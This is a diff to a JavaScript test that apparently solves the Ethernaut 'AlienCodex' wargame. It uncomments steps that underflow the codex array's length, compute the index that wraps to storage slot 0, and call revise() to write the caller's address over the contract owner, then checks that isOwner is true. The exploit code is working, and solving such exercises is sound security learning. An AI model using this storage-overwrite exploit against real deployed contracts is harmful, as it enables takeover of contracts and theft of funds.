@@ -26,7 +26,6 @@ describe("aliencodex", function() {
         targetCont = targetCont.connect(eoa);
 
 
-        /*
         // a contract modifier checks this
         let tx = await targetCont.make_contact();
         await tx.wait();
@@ -36,7 +35,6 @@ describe("aliencodex", function() {
         tx = await targetCont.retract();
         await tx.wait();
         console.log(tx);
-        */
 
         /* 
          * 0: 0x000000000000000000000001da5b3fb76c78b6edee6be8f11a1c31ecfb02b272
@@ -55,13 +53,11 @@ describe("aliencodex", function() {
          * https://github.com/Arachnid/uscc/tree/master/submissions-2017/doughoyte#solidity-storage-layout
         */
 
-        /*
         // print first x storage slot
         for (let i = 0; i < 5; i++) {
             let slot = await eoa.provider!.getStorageAt(targetCont.address, i);
             console.log(`${i}: ${slot}`);
         }
-        */
 
         let storageSpace = ethers.BigNumber.from(2).pow(256);
         // codex is at storage index 1 so keccak256(1)
@@ -73,10 +69,10 @@ describe("aliencodex", function() {
         // pad addres with 0s to fill bytes32 typed param
         let addr = ethers.utils.zeroPad(eoa.address, 32);
         
-        let tx = await targetCont.revise(diffToStorage0, addr);
+        tx = await targetCont.revise(diffToStorage0, addr);
         await tx.wait();
         console.log(tx);
-
+        
         const isOwner = await targetCont.isOwner();
         expect(isOwner).to.be.true;
     });
